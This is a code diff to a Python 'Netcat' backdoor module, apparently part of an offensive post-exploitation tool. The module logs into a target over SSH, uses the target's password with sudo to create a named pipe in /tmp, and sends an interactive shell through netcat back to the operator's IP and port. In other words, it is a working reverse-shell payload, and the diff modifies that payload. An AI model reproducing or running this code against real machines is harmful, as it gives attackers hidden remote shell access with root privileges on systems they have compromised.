@@ -15,16 +15,17 @@ class Netcat(Backdoor):
         self.modules = {} 
         
     def get_command(self):
-        return "echo " + self.core.curtarget.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.core.localIP + " %s > sudo nohup /tmp/f &" % self.get_value("port")
+        return "echo " + self.core.curtarget.pword + " | sudo -S nohup cat /tmp/f | /bin/sh -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f" % self.get_value("port")
  
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
         raw_input("Enter the following command in another terminal: nc -v -n -l -p %s" % port)
         print(GOOD + "Initializing backdoor...")
-        target.ssh.exec_command("echo " + target.pword + " | sudo -S rm /tmp/f;")
-        target.ssh.exec_command("echo " + target.pword + " | sudo -S mkfifo /tmp/f;")
-        target.ssh.exec_command(self.get_command())
+        target.ssh.exec_command("echo " + target.pword + " | sudo -S rm /tmp/f")
+        target.ssh.exec_command("echo " + target.pword + " | sudo -S mkfifo /tmp/f")
+        target.ssh.exec_command("echo " + target.pword + " | sudo -S chmod 222 /tmp/f")
+	target.ssh.exec_command(self.get_command())
         print(GOOD + "Netcat backdoor on port %s attempted." % port)
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
